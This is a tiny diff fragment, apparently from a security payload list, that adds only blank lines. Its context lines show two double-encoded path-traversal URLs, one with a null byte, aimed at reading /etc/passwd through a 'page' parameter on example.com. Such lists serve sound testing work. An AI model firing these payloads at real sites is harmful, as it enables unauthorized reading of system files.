@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:22:18.368371+00:00'
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
 ```
+
+
